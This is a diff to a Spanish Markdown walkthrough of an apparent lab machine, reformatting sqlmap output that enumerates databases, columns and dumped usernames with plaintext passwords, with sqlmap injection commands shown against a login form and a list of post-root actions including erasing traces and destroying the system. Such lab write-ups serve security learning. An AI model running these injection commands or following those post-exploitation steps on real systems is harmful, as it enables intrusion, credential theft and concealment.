@@ -60,12 +60,11 @@ sqlmap -u http://172.17.0.2/login.html --forms --dbs --batch
 
 **Bases de datos disponibles:**
 
-available databases [5]:
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] sys
-[*] users
+- information_schema  
+- mysql  
+- performance_schema  
+- sys  
+- users ✅
 
 ### b. Tablas en la base de datos `users`
 
@@ -83,13 +82,11 @@ sqlmap -u http://172.17.0.2/login.html --forms -D users --tables
 sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --columns
 ```
 
-+----------+--------------+
-| Column   | Type         |
-+----------+--------------+
-| id       | int(11)      |
-| password | varchar(255) |
-| username | varchar(255) |
-+----------+--------------+
+| Columna  | Tipo          |
+|----------|---------------|
+| id       | int(11)       |
+| username | varchar(255)  |
+| password | varchar(255)  |
 
 ### d. Extracción de datos
 
@@ -97,13 +94,11 @@ sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --columns
 sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --dump
 ```
 
-+----+---------------+----------+
-| id | password      | username |
-+----+---------------+----------+
-| 1  | $paco$123     | paco     |
-| 2  | P123pepe3456P | pepe     |
-| 3  | jjuuaann123   | juan     |
-+----+---------------+----------+
+| ID | Username | Password      |
+|----|----------|---------------|
+| 1  | paco     | $paco$123     |
+| 2  | pepe     | P123pepe3456P |
+| 3  | juan     | jjuuaann123   |
 
 ---
 
@@ -191,12 +186,3 @@ Acciones sugeridas tras obtener acceso root:
 - 🔄 Realizar pivoting a otras máquinas  
 - 🧹 Eliminar rastros  
 - ⚠️ *Destrucción del sistema (no recomendada)*
-
----
-
-🎉 ¡Acceso root conseguido exitosamente!
-```
-
----
-
-¿Quieres que te genere también una versión en PDF o HTML para compartir o imprimir?
